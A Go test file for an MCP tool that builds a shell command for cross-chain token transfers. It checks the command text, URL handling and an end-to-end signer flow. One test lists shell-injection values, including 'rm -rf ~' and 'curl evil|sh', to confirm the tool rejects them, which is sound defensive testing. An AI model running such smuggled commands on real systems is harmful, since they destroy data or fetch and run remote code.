package mcp

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/Cogwheel-Validator/spectra-portal/signer"

	sdk "github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/zeebo/assert"
)

func prepare(t *testing.T, opts Options, in prepareTransferInput) (*sdk.CallToolResult, error) {
	t.Helper()
	tl := testTools(t, newFakeLCD(t), newFakeLCD(t), opts)
	res, _, err := tl.prepareTransfer(context.Background(), nil, in)
	return res, err
}

var okInput = prepareTransferInput{ChainFrom: "cosmoshub-4", TokenFrom: "uatom", AmountIn: "1000000", ChainTo: "osmosis-1"}

func TestPrepareTransferReturnsRunnableCommand(t *testing.T) {
	res, err := prepare(t, Options{PublicURL: "https://pf.example.com/"}, okInput)
	assert.NoError(t, err)
	body := res.Content[0].(*sdk.TextContent).Text
	want := "pathfinder-sign --pathfinder-url https://pf.example.com --chain-from cosmoshub-4 --token-from uatom --amount 1000000 --chain-to osmosis-1"
	assert.True(t, strings.Contains(body, want))
	assert.False(t, strings.Contains(body, "--recipient"))

	sc := res.StructuredContent.(map[string]any)
	assert.Equal(t, sc["command"], want)
	assert.NotNil(t, sc["signing_request"])
	assert.NotNil(t, sc["preview"])
}

func TestPrepareTransferFlagsAgentChosenRecipient(t *testing.T) {
	in := okInput
	in.Recipient = testAddr(t, "osmo", 3)
	res, err := prepare(t, Options{PublicURL: "https://pf.example.com"}, in)
	assert.NoError(t, err)
	body := res.Content[0].(*sdk.TextContent).Text
	assert.True(t, strings.Contains(body, "--recipient "+in.Recipient))
	assert.True(t, strings.Contains(body, "supplied by you"))
}

// The agent controls these strings and the command is run in a shell, so
// anything shell-special must be rejected.
func TestPrepareTransferRejectsShellInjection(t *testing.T) {
	for _, bad := range []string{"uatom; rm -rf ~", "uatom && curl evil|sh", "$(id)", "a b", "`id`", "uatom\nx", "'"} {
		in := okInput
		in.TokenFrom = bad
		_, err := prepare(t, Options{PublicURL: "https://pf.example.com"}, in)
		if err == nil {
			t.Errorf("token_from %q was accepted", bad)
		}
		in = okInput
		in.Recipient = bad
		_, err = prepare(t, Options{PublicURL: "https://pf.example.com"}, in)
		if err == nil {
			t.Errorf("recipient %q was accepted", bad)
		}
	}
	_, err := prepare(t, Options{PublicURL: "https://pf.example.com/;id"}, okInput)
	assert.Error(t, err)
}

func TestPrepareTransferNeedsAKnownPublicURL(t *testing.T) {
	_, err := prepare(t, Options{}, okInput)
	assert.Error(t, err)
	assert.True(t, strings.Contains(err.Error(), "mcp_public_url"))
}

func TestPrepareTransferUnknownRouteIsAnError(t *testing.T) {
	in := okInput
	in.ChainTo = "nowhere-1"
	_, err := prepare(t, Options{PublicURL: "https://pf.example.com"}, in)
	assert.Error(t, err)
}

func TestBaseURLFromHeaders(t *testing.T) {
	tl := testTools(t, newFakeLCD(t), newFakeLCD(t), Options{})
	mk := func(h http.Header) *sdk.CallToolRequest {
		return &sdk.CallToolRequest{Extra: &sdk.RequestExtra{Header: h}}
	}

	assert.Equal(t, tl.baseURL(nil), "")
	assert.Equal(t, tl.baseURL(mk(http.Header{hostHeader: {"pf.example.com"}})), "https://pf.example.com")
	assert.Equal(t, tl.baseURL(mk(http.Header{hostHeader: {"localhost:8080"}})), "http://localhost:8080")
	assert.Equal(t, tl.baseURL(mk(http.Header{"X-Forwarded-Host": {"pf.example.com"}, "X-Forwarded-Proto": {"https"}, hostHeader: {"10.0.0.5:8080"}})), "https://pf.example.com")
}

// End to end: the real pathfinder-sign MCP client against the real MCP HTTP
// handler, through the signer's local /api endpoints.
func TestSignerTalksToTheMCPServer(t *testing.T) {
	tl := testTools(t, newFakeLCD(t), newFakeLCD(t), Options{})
	srv := sdk.NewServer(&sdk.Implementation{Name: "t", Version: "0"}, nil)
	tl.register(srv)
	tl.registerTx(srv)
	hs := httptest.NewServer(Handler(srv))
	defer hs.Close()

	remote, err := signer.Dial(context.Background(), hs.URL+"/", "test")
	assert.NoError(t, err)
	defer func() { _ = remote.Close() }()

	s, err := signer.New(&signer.Request{
		PathfinderURL: hs.URL,
		Transfer:      signer.Transfer{ChainFrom: "cosmoshub-4", TokenFrom: "uatom", AmountIn: "1000000", ChainTo: "osmosis-1"},
	}, remote)
	assert.NoError(t, err)
	link, err := s.Listen(0)
	assert.NoError(t, err)
	go s.Serve(context.Background(), time.Minute)

	i := strings.Index(link, "/?t=")
	req, err := http.NewRequestWithContext(context.Background(), http.MethodGet, link[:i]+"/api/request", nil)
	assert.NoError(t, err)
	req.Header.Set("X-Spectra-Token", link[i+4:])
	resp, err := http.DefaultClient.Do(req)
	assert.NoError(t, err)
	defer func() { _ = resp.Body.Close() }()
	assert.Equal(t, resp.StatusCode, 200)
	var got struct {
		Preview struct {
			Required []string `json:"required_chains"`
		} `json:"preview"`
	}
	assert.NoError(t, json.NewDecoder(resp.Body).Decode(&got))
	assert.Equal(t, len(got.Preview.Required), 2)
}

// Regression: Go removes Host from the header map, so the public URL has to
// come through Handler. Exercised over real HTTP with a Host header, no
// mcp_public_url configured and no X-Forwarded-* headers (a plain tunnel).
func TestPrepareTransferDerivesURLFromHostOverHTTP(t *testing.T) {
	tl := testTools(t, newFakeLCD(t), newFakeLCD(t), Options{})
	srv := sdk.NewServer(&sdk.Implementation{Name: "t", Version: "0"}, nil)
	tl.registerSigning(srv)
	hs := httptest.NewServer(Handler(srv))
	defer hs.Close()

	c := sdk.NewClient(&sdk.Implementation{Name: "c", Version: "0"}, nil)
	sess, err := c.Connect(context.Background(), &sdk.StreamableClientTransport{
		Endpoint: hs.URL, HTTPClient: &http.Client{Transport: hostRewrite{"pathfinder-mcp.example.com"}},
	}, nil)
	assert.NoError(t, err)
	defer func() { _ = sess.Close() }()
	res, err := sess.CallTool(context.Background(), &sdk.CallToolParams{Name: "prepare_transfer", Arguments: map[string]any{
		"chain_from": "cosmoshub-4", "token_from": "uatom", "amount_in": "1000000", "chain_to": "osmosis-1",
	}})
	assert.NoError(t, err)
	assert.False(t, res.IsError)
	assert.True(t, strings.Contains(res.Content[0].(*sdk.TextContent).Text, "--pathfinder-url https://pathfinder-mcp.example.com "))
}

type hostRewrite struct{ host string }

func (h hostRewrite) RoundTrip(r *http.Request) (*http.Response, error) {
	r = r.Clone(r.Context())
	r.Host = h.host
	return http.DefaultTransport.RoundTrip(r)
}
